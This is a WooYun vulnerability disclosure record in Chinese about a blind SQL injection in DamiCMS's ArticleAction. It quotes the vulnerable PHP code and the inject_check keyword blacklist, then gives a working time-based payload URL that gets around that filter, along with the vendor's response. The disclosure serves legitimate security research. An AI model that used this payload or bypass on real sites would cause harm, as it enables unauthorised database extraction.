{"id": 43833, "wybug_id": "wooyun-2014-081510", "wybug_title": "大米CMS某处SQL盲注绕过防御", "wybug_corp": "damicms.com", "wybug_author": "xfkxfk", "wybug_date": "2014-11-03 14:36", "wybug_open_date": "2015-02-01 14:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "盲注", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向公众公开  简要描述： 大米CMS某处SQL盲注 详细说明：  最新版大米CMS文件/Web/Lib/Action/ArticleAction.class.php\npublic function index()\t{\t\tif(!isset($_GET['aid']))\t\t{\t\t\t$this->error('非法操作');\t\t}\t\tinject_check($_GET['aid']);\t\tinject_check($_GET['p']);$aid = intval($_GET['aid']);//读取数据库和缓存ob_start();//用于生成静态HTML$is_build = C('IS_BUILD_HTML');//允许参数$allow_param = array('p','keyword');$static_file ='./Html/'.cookie('think_template').'/articles/'.$aid;$mid_str ='';if(count($_REQUEST) >1){foreach($_REQUEST as $k=>$v){if($k != 'aid' && in_array($k,$allow_param)){$mid_str .= '/'.$k.'/'.$v;}}}$static_file .= ($mid_str .'.html');$path = './ArticleAction.class.php';$php_file = basename($path);parent::html_init($static_file,$php_file,$is_build);//以下是动态代码$article = M('article');$config = F('basic','','./Web/Conf/');$page_model = 'page/page_default.html';\t    //相关判断$alist = $article->where('aid='.intval($_GET['aid']))->find();if(!$alist){alert('文章不存在或已删除!',__APP__);}if($alist['islink'] == 1){Header('Location:'.$alist['linkurl']);}\t\tif($alist['status'] == 0){alert('文章未审核!',__APP__);}$this->assign('title',$alist['title']);parent::tree_dir($alist['typeid'],'tree_list');$type = M('type');$list = $type->where('typeid='.intval($alist['typeid']))->find();$this->assign('type',$list);$a = M('type')->where('typeid='.$alist['typeid'])->getField('page_path');if( $a !='' && file_exists(TMPL_PATH.cookie('think_template').'/'.$a)){$page_model = $a;\t\t} \t//网站头部R('Public','head');R('Public','py_link');\t//统计处理if($alist['status'] == 1){$map['hits'] = $alist['hits']+1;//echo $_GET['aid'];$article->where('aid='.$_GET['aid'])->save($map);}\n看最后一行：\n$article->where('aid='.$_GET['aid'])->save($map);\n$_GET['aid']直接进入SQL了这里在前面有检测$_GET['aid']inject_check($_GET['aid']);来看看这个inject_check函数，文件/Web/Common/common.php\n//防止sql注入\tfunction inject_check($str)\t{\t\t$tmp=eregi('select|insert|update|and|or|delete|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile', $str);\t\tif($tmp)\t\t{\t\talert(\"非法操作!\",3);\t\t}\t\telse\t\t{\t\t\treturn $str;\t\t}\t}\n这里过滤一些关键字，但是我们可以绕过进行盲注这里可以是使用：\nhttp://localhost/dami/index.php?s=/articles/127+||+if(hex(mid(user(),1,1))=72,sleep(1),0)\n这样就可以绕过，进行盲注了   漏洞证明：  访问：\nhttp://localhost/dami/index.php?s=/articles/127+||+if(hex(mid(user(),1,1))=72,sleep(1),0)\n这是会延迟18秒，由于默认安装大米cms后数据表中有18行数据，所以这里会延迟18s具体利用见测试代码\n\n   修复方案：  intval($_GET['aid'])   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-11-03 21:12 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-03 17:39 |    \t\tSLAckEr \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:23        | 安全爱好者 ID：小歪)\t\t \n  6666666    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}